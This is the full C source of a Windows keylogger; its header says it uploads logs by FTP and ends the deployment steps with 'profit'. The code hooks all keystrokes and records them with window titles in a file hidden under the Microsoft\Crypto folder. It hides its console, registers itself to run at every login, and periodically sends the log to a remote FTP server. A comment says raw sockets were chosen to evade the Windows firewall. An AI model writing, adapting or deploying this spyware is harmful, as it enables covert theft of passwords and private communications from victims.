/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
 *                                                                             *
 * file:        keylogger.c                                                    *
 *                                                                             *
 * purpose:     a tiny keylogger with ftp upload.                              *
 *                                                                             *
 * usage:       + copy config.def.h to config.h and edit                       *
 *              + compile (with MinGW):                                        *
 *              $ gcc.exe keylogger.c -lwsock32 -o <name.exe> -s -Os           *
 *              + copy <name.exe> to host                                      *
 *              + run it and ... profit :)                                     *
 *                                                                             *
 * coded by:    chinarulezzz, <alexandr.savca89@gmail.com>                     *
 *                                                                             *
 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
 *                                                                             *
 * NOTE:                                                                       *
 *              from WinXP log file is coming in CP1251 encoding               *
 *              from Win7-Win8 in UTF-16LE                                     *
 *                                                                             *
 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

#include <windows.h>
#include <winuser.h>
#include <windowsx.h>
#include <winsock.h>
#include <process.h>
#include <locale.h>
#include <time.h>
#include <stdio.h>

#include "config.h"

#define AUTORUN "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
#define APPDATA "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders"

#define BUFSIZE 255

/* Full file path and name to the current executable */
wchar_t exeLocation[BUFSIZE];

/* Save log to %APPDATA%\Microsoft\Crypto directory */
wchar_t logLocation[BUFSIZE];

/* Store window title */
wchar_t prevWindowText[BUFSIZE];


/* The function that implements the key logging functionality */
LRESULT CALLBACK
LowLevelKeyboardProc (int nCode, WPARAM wParam, LPARAM lParam)
{
  /* Declare a pointer to the KBDLLHOOKSTRUCT */
  KBDLLHOOKSTRUCT *pKeyboard = (KBDLLHOOKSTRUCT *) lParam;

  /* Open log file */
  FILE *logFile = _wfopen (logLocation, L"a+, ccs=UTF-16LE");

  if (logFile == NULL)
    {
      perror ("_wfopen in LowLevelKeyboardProc");
      /* Critical error: we really need to have log file */
      exit (1);
    }

  if (wParam == WM_KEYUP) /* When the key has been pressed and released */
    {
      HWND current_window = GetForegroundWindow ();

      /* If current window have title */
      if (GetWindowTextLength (current_window))
        {
          /* Get current title */
          wchar_t currWindowText[BUFSIZE];
          GetWindowTextW (current_window, currWindowText, BUFSIZE);

          /* If it differs from the previous */
          if (wcscmp (prevWindowText, currWindowText) != 0)
            {
              time_t now;
              time (&now);
              struct tm *timeinfo = localtime (&now);

              wchar_t dateTime[18];
              wcsftime (dateTime, 18, L"%H:%M:%S %m/%d/%y", timeinfo);

              /* Write current window title and date time to log */
              fwprintf (logFile, L"\n\n\n[%ls %s]\n", dateTime,
                        currWindowText);
            }
          /* Store current window title */
          wcscpy (prevWindowText, currWindowText);
        }

      /* Get the keyboard layout, code and state */
      HKL current_layout =
        GetKeyboardLayout (GetWindowThreadProcessId (current_window, NULL));

      BYTE code = (unsigned char) pKeyboard->vkCode;

      BYTE keystate[BUFSIZE];

      GetKeyboardState (keystate);
      keystate[VK_SHIFT] = GetKeyState (VK_SHIFT);
      keystate[VK_CAPITAL] = GetKeyState (VK_CAPITAL);
      keystate[VK_CONTROL] = GetKeyState (VK_CONTROL);
      /* keystate[VK_MENU] = GetKeyState(VK_MENU); */

      wchar_t wcode[2] = { '\0' };
      ToUnicodeEx (code, pKeyboard->scanCode, keystate, wcode, 1, 0,
                   current_layout);

      /* Write current key code to log */
      fwprintf (logFile, L"%s", wcode);
    }

  fclose (logFile);
  return CallNextHookEx (NULL, nCode, wParam, lParam);
}

/*
 * This function is called by timer for sending a log file to ftp server.
 * Is used low-level sockets instead of wininet library, because
 * usage if wininet is detected by windows firewall (e.g. at win7).
 */
unsigned CALLBACK
send2ftp (void *arg)
{
  HANDLE timer = (HANDLE) arg;

  while (1)
    {
      WaitForSingleObject (timer, INFINITE);

      WSADATA ws;

      if (WSAStartup (0x101, &ws) != NO_ERROR)
        {
          fprintf (stderr, "WSAStartup: %d\n", WSAGetLastError ());
          continue; /* It is not critical error, try another time */
        }

      /* Open up a socket for out tcp/ip session */
      SOCKET sock = socket (AF_INET, SOCK_STREAM, 0);

      /* Set up socket info */
      struct sockaddr_in a;
      a.sin_family = AF_INET;
      a.sin_port = htons (PORT);

      /* Get the ip address for our ftp */
      struct hostent *h;
      if ((h = gethostbyname (SERVER)) == NULL)
        {
          fprintf (stderr, "gethostbyname: %d\n", WSAGetLastError ());
          continue;
        }

      a.sin_addr.s_addr =
        inet_addr (inet_ntoa (*((struct in_addr *) h->h_addr)));

      /* Actually connect to the server */
      if (connect (sock, (struct sockaddr *) &a, sizeof (a)) == SOCKET_ERROR)
        {
          fprintf (stderr, "connect to sock: %d\n", WSAGetLastError ());
          continue;
        }

      /* Need more that 256 bytes for receive server responds */
      char buf[BUFSIZE * 2] = { '\0' };

      if (recv (sock, buf, sizeof (buf), 0) == SOCKET_ERROR)
        {
          fprintf (stderr, "recv from sock: %d\n", WSAGetLastError ());
          continue;
        }

      /* Login */
      sprintf (buf, "USER %s\r\n", USERNAME);
      send (sock, buf, strlen (buf), 0);
      recv (sock, buf, sizeof (buf), 0);

      /* Password */
      sprintf (buf, "PASS %s\r\n", PASSWORD);
      send (sock, buf, strlen (buf), 0);
      recv (sock, buf, sizeof (buf), 0);

      /* Transferring file as a binary stream of data instead of text */
      sprintf (buf, "TYPE I\r\n");
      send (sock, buf, strlen (buf), 0);
      recv (sock, buf, sizeof (buf), 0);

      /* Tells the server to enter "passive mode" */
      sprintf (buf, "PASV\r\n");
      send (sock, buf, strlen (buf), 0);
      memset (buf, 0, sizeof (buf));
      recv (sock, buf, sizeof (buf), 0);

      /*
       * So our string is in buf, which is for example:
       * "227 Entering Passive Mode (216,92,6,187,194,13)"
       * Lets extract the string "216,92,6,187,194,13"
       */

      char szIP[40];
      char *start = strchr (buf, '(');
      char *end = strchr (buf, ')');
      int num = end - start;
      char str[30] = { '\0' };

      strncpy (str, start + 1, num - 1);

      /* str now contains "216,92,6,187,194,13" */

      char *token = strtok (str, ",");

      /* Lets break the string up using the ',' character as a separator
       * and get the ip address from the string
       */

      strcpy (szIP, "");
      strcat (szIP, token);
      strcat (szIP, ".");               /* szIP contains "216." */

      token = strtok (NULL, ",");
      strcat (szIP, token);
      strcat (szIP, ".");               /* szIP contains "216.92." */

      token = strtok (NULL, ",");
      strcat (szIP, token);
      strcat (szIP, ".");               /* szIP contains "216.92.6" */

      token = strtok (NULL, ",");
      strcat (szIP, token);             /* szIP contains "216.92.6.187" */

      /* Now lets get the port number */

      token = strtok (NULL, ",");
      int port = atoi (token) * 256;    /* 194 * 256 */

      token = strtok (NULL, ",");
      port += atoi (token);             /*   + 13    */

      /* Open up a socket for passive transfer session */
      SOCKET pasv = socket (AF_INET, SOCK_STREAM, 0);

      /* Set up socket info */
      struct sockaddr_in b;
      b.sin_family = AF_INET;
      b.sin_port = htons (port);
      b.sin_addr.s_addr = inet_addr (szIP);

      /* Entering passive mode connection */
      if (connect (pasv, (struct sockaddr *) &b, sizeof (b)) == SOCKET_ERROR)
        {
          fprintf (stderr, "connect to pasv: %d\n", WSAGetLastError ());
          continue;
        }

      /* Begins transmission of a file to the remote site.
       * Remote file name is "MACHINE.UNIX_TIMESTAMP"
       */

      sprintf (buf, "STOR %s.%i\r\n", MACHINE, (int) time (NULL));
      send (sock, buf, strlen (buf), 0);
      recv (sock, buf, sizeof (buf), 0);

      /* Log file being sent by piecemeal */
      FILE *logFile = _wfopen (logLocation, L"r, ccs=UTF-16LE");

      if (logFile == NULL)
        {
          perror ("_wfopen in send2ftp");
          continue;
        }

      /* We use "fread() != 0" instead of "!feof()" because log file
       * may contain more than one EOF character
       */
      while (fread (buf, 1, sizeof (buf), logFile) != 0)
        {
          send (pasv, buf, sizeof (buf), 0);
          memset (buf, 0, sizeof (buf));
          Sleep (1000); /* 1 sec. delay */
        }

      fclose (logFile);

      closesocket (sock);
      closesocket (pasv);

      WSACleanup ();

    } /* end while */
}

int
main (int argc, char **argv)
{
  /* Allocates a new console for the calling process */
  AllocConsole ();

  /* Create stealth (window is not visible) */
  HWND stealth = FindWindowA ("ConsoleWindowClass", NULL);
#ifndef DEBUG
  ShowWindow (stealth, 0);
#endif

  setlocale (LC_CTYPE, "");

  /* Get current executable path to `exeLocation` */
  mbstowcs (exeLocation, argv[0], strlen (argv[0]) + 1);

  /* Get %AppData% path from registry and save to `logLocation` */
  HKEY hk;
  DWORD dwSize = MAX_PATH;
  DWORD dwRet;

  dwRet = RegOpenKeyEx (HKEY_CURRENT_USER, APPDATA, 0, KEY_QUERY_VALUE, &hk);
  if (dwRet == ERROR_SUCCESS)
    {
      dwRet =
        RegQueryValueExW (hk, L"AppData", NULL, NULL, (LPSTR) logLocation,
                          &dwSize);

      if (dwRet != ERROR_SUCCESS)
        {
          fprintf (stderr, "RegQueryValueEx: %d\n", dwRet);
          exit (1); /* critical error: logLocation is not defined */
        }
    }
  else
    {
      fprintf (stderr, "RegOpenKeyEx: %d\n", dwRet);
      exit (1); /* critical error: logLocation is not defined */
    }

  wcscat (logLocation, L"\\Microsoft\\Crypto\\");
  wcscat (logLocation, LOG_FILE);

  /* Run keylogger with Windows start */
  dwRet = RegCreateKey (HKEY_CURRENT_USER, AUTORUN, &hk);
  if (dwRet == ERROR_SUCCESS)
    RegSetValueExW (hk, NAME, 0, REG_SZ, (LPSTR) exeLocation, MAX_PATH);
  else
    {
      fprintf (stderr, "RegCreateKey: %d\n", dwRet);
      exit (1); /* critical error: unable to set autorun key */
    }

  RegCloseKey (hk);

  /* Create timer for ftp upload procedure */
  HANDLE timer = CreateWaitableTimer (0, 0, 0);

  /* Set the event the first time 30 seconds */
  LARGE_INTEGER li;
  li.QuadPart = -(30 * 10 * 1000 * 1000);

  /* After calling SetWaitableTimer set timer at `SEND_LOG_PERIOD` */
  if (! SetWaitableTimer (timer, &li, SEND_LOG_PERIOD, 0, 0, 0))
    {
      fprintf (stderr, "CreateWaitableTimer failed: %d\n", GetLastError ());
      exit (1); /* Critical error */
    }

  /* Run ftp upload in background thread.
   *
   * NOTE:
   *   Why we use _beginthreadex instead of CreateThread function you
   *   can see at http://www.mingw.org/wiki/Use_the_thread_library
   */
  if (_beginthreadex (0, 0, send2ftp, (void *) timer, 0, 0) == 0)
    {
      perror ("_beginthreadex failed");
      exit (1); /* Critical error */
    }

  /* Retrieve the application instance */
  HINSTANCE instance = GetModuleHandle (NULL);

  /* Set a global hook to capture keystrokes */
  SetWindowsHookEx (WH_KEYBOARD_LL, LowLevelKeyboardProc, instance, 0);

  MSG msg;

  while (1) /* Wait forever */
    while (GetMessage (&msg, NULL, 0, 0))
      DispatchMessage (&msg);

}

/* EOF */
